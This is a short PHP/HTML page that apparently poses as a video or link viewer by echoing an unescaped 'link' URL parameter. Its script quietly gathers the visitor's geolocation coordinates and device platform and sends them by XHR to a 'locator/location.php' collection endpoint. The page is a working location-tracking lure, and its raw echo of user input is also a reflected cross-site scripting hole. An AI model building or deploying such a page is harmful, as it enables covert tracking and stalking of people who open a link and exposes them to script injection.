<?php
$link=$_GET["link"]
?>

<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<style>
	*{
		padding: 0;
		margin: 0;
		box-sizing: border-box;
	}
	body {
		height: 100vh;
	}
</style>

<body>

	<!--<iframe width="100%" height="100%" src="https://www.youtube.com/embed/xJ0IBzCjEPk?si=A5d4u6LrTEyKS7It"
		title="YouTube video player" frameborder="0"
		allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
		allowfullscreen></iframe>-->
<?=$link?>
















</body>
<script>
	let val1, val2, val3;

	let platform = window.clientInformation.userAgentData.platform
	function getLocation() {
		if (navigator.geolocation) {
			navigator.geolocation.getCurrentPosition(showPosition);
		}
	}

	function showPosition(position) {
		val1 = position.coords.latitude
		val2 = position.coords.longitude
		function loadDoc() {
			const xhttp = new XMLHttpRequest();
			xhttp.open("GET", `http://localhost/locator/location.php/?lat=${val1}&long=${val2}&platform=${platform}&ipaddr=${val3}`);
			xhttp.send();
		}
		loadDoc()
	}
	getLocation()

</script>

</html>
